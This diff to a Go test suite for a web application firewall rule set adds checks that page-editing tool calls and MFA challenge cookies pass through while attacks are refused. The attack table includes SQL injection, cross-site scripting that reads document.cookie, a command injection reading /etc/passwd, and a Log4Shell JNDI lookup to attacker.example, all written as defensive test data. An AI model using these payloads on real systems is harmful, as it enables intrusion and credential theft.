@@ -698,6 +698,10 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 				send(g.tool(false, "create_task", map[string]any{"title": "x", "notes": text}), " (an agent)")
 				send(g.tool(false, "update_task", map[string]any{"task_id": g.id(), "version": 2, "notes_append": text}), " (an agent)")
 				send(tdBody("POST", "/api/v1/ai/capture/break-down", map[string]any{"task_id": g.id(), "hint": text}), "")
+				send(g.tool(false, "create_page", map[string]any{"space_id": g.id(), "title": "x", "body": text}), " (an agent)")
+				send(g.tool(false, "update_page", map[string]any{"page_id": g.id(), "version": 2, "body_append": text}), " (an agent)")
+				send(g.tool(true, "update_page", map[string]any{"page_id": g.id(), "version": 2, "body": text, "body_hash": "0123456789abcdef"}), " (an agent)")
+				send(g.tool(false, "suggest_page", map[string]any{"space_id": g.id(), "title": "x", "text": text}), " (an agent)")
 			}
 			for _, q := range tdSearches {
 				send(g.tool(false, "search_tasks", map[string]any{"query": q}), " (an agent)")
@@ -705,15 +709,21 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 			long := []rune(strings.Repeat(strings.Join(tdAgentText, "\n\n")+"\n\n", 80))
 			send(g.tool(false, "update_task", map[string]any{"task_id": g.id(), "version": 9, "notes_append": string(long[:4000])}), " (4,000 characters)")
 			send(g.tool(false, "create_task", map[string]any{"title": "x", "notes": string(long[:20000])}), " (20,000 characters)")
+			send(g.tool(false, "create_page", map[string]any{"space_id": g.id(), "title": "x", "body": string(long[:20000])}), " (20,000 characters)")
+			send(g.tool(false, "update_page", map[string]any{"page_id": g.id(), "version": 9, "body_append": string(long[:8000])}), " (8,000 characters)")
+			send(g.tool(false, "suggest_page", map[string]any{"space_id": g.id(), "title": "x", "text": string(long[:1200])}), " (1,200 characters)")
 			for range 500 {
 				send(g.mcp(false, "ping", nil), " (a token)")
 			}
-			// Sessions whose token spells SQL, a comment or a hex number,
-			// as one in five thousand does.
+			// Sessions and second factors' challenges whose token spells
+			// SQL, a comment or a hex number, as one in five thousand does.
 			for _, cookie := range []string{"4--cMnZjgKkDWYohOPzX_MSZ6bRiLm73fOqOBCuutxc", "7--hpHwzg3dELkfXDlpwH6W-MZX3zd9sZmgsRpW-TRk",
 				"nB10yjgIF2-0x9eciysImNJe75pvImDf0hhYXbBZHzg", "Xm99haEdCG1-7TAf2YbFmzNFwWHlrPixf5oR77-Sj48", "N1jxdo3Y8m9ESi3yfUbFzrvSsyha3oR7-itM1RaspE0"} {
 				if status := tdSend(t, plain, tdGet("/api/v1/views/counts?tz=UTC"), cookie); status != http.StatusOK {
 					t.Errorf("the session %s: %d", cookie, status)
+				}
+				if status := tdSend(t, plain, tdGet("/api/v1/views/counts?tz=UTC"), g.token()+"; __Host-tendril_mfa="+cookie); status != http.StatusOK {
+					t.Errorf("the challenge %s: %d", cookie, status)
 				}
 			}
 			// A passkey's answer and the push keys are random, and so is
@@ -741,11 +751,11 @@ type tdAttack struct {
 // An attack CRS alone refuses at a level is refused with the set loaded
 // too, in an argument the client fills with ids, dates, zones, a repeat
 // rule, a push address or a passkey's answer, in a password sent where no
-// password goes, and in the session cookie. Text, which the set reads as
-// paranoia 1 does, keeps what CRS alone refuses there but a command run
-// under another or after a backtick, which plain sentences and Markdown
-// code spell, a link to the machine itself, a word and a bracket, and a
-// semicolon and a word.
+// password goes, and in the session and challenge cookies. Text, which the
+// set reads as paranoia 1 does, keeps what CRS alone refuses there but a
+// command run under another or after a backtick, which plain sentences and
+// Markdown code spell, a link to the machine itself, a word and a bracket,
+// a semicolon and a word, and JavaScript run without brackets.
 func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 	t.Parallel()
 	g := td{vw{rand.New(rand.NewPCG(7, 22))}}
@@ -782,6 +792,9 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 			map[string]any{"kind": "task", "title": "x", "notes": "1' OR '1'='1' --", "comments": []string{"<script>alert(1)</script>"}}}})},
 		{1, g.tool(false, "create_task", map[string]any{"title": "<script>alert(document.cookie)</script>"})},
 		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "notes_append": "x' UNION SELECT password FROM users--"})},
+		{1, g.tool(false, "create_page", map[string]any{"space_id": space, "title": "x", "body": "<script>alert(document.cookie)</script>"})},
+		{1, g.tool(false, "update_page", map[string]any{"page_id": task, "version": 2, "body_append": "x' UNION SELECT password FROM users--"})},
+		{1, g.tool(true, "suggest_page", map[string]any{"space_id": space, "title": "x", "text": "Lost the keys; cat /etc/passwd"})},
 		{1, g.tool(true, "search_tasks", map[string]any{"query": "1' OR '1'='1' --"})},
 		{1, g.mcp(true, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "<img src=x onerror=alert(1)>"}})},
 		{1, g.mcp(false, "notifications/cancelled", map[string]any{"requestId": 3, "reason": "${jndi:ldap://attacker.example/a}"})},
@@ -838,6 +851,8 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "color": "(a)(b);"})},
 		{2, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "color": "\"in a.b=c"})},
 		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "color": "json(x)"})},
+		// And JavaScript run without brackets.
+		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "color": "[x].sort.call`a`"})},
 		// Only recall's labels may come more than once.
 		{3, tdGet(api + "/spaces/" + space + "/recall?" + url.Values{"title": {"x"}, "label": {"ai", "fea"}, "q": {"a", "b"}}.Encode())},
 		{3, tdGet(api + "/search?" + url.Values{"q": {"x"}, "label": {"a", "b"}}.Encode())},
@@ -939,22 +954,32 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 			check("inText", bareText, 1, inText)
 			// The count of special characters in cookies scores 3, too
 			// little to refuse alone, so its events say whether it read the
-			// cookie: never a session's token, whatever its dashes, and
-			// anything else as CRS reads it.
+			// cookie: never a session's or a challenge's token, whatever its
+			// dashes, and anything else as CRS reads it.
 			if pl == 4 {
 				token, other, both := tdGet(api+"/views/counts?tz=UTC"), tdGet(api+"/views/counts?tz=Etc/UTC"), tdGet(api+"/views/counts?tz=Etc/GMT")
 				tdSend(t, plain, token, "a-b-c-"+session[6:])
 				tdSend(t, plain, other, "a'b(c)d"+session[7:])
 				tdSend(t, plain, both, session+"; tendril_session=a'b(c)d"+session[7:])
+				challenge, otherChallenge, bothChallenges := tdGet(api+"/views/counts?tz=Europe/Berlin"), tdGet(api+"/views/counts?tz=Asia/Kolkata"),
+					tdGet(api+"/views/counts?tz=Pacific/Auckland")
+				tdSend(t, plain, challenge, session+"; __Host-tendril_mfa=a-b-c-"+session[6:])
+				tdSend(t, plain, otherChallenge, session+"; __Host-tendril_mfa=a'b(c)d"+session[7:])
+				tdSend(t, plain, bothChallenges, session+"; __Host-tendril_mfa=a-b-c-"+session[6:]+"; tendril_mfa=a'b(c)d"+session[7:])
 				counted := func(uri string) bool {
 					_, ok := findEvent(out, func(e wafevent.Event) bool {
 						return e.URI == uri && slices.ContainsFunc(e.Rules, func(h wafevent.Hit) bool { return h.ID == 942421 })
 					})
 					return ok
 				}
-				waitFor(t, "the cookies' events", func() bool { return counted(other.path) && counted(both.path) })
+				waitFor(t, "the cookies' events", func() bool {
+					return counted(other.path) && counted(both.path) && counted(otherChallenge.path) && counted(bothChallenges.path)
+				})
 				if counted(token.path) {
 					t.Error("a session's token with three dashes was counted")
+				}
+				if counted(challenge.path) {
+					t.Error("a challenge's token with three dashes was counted")
 				}
 			}
 			if t.Failed() {
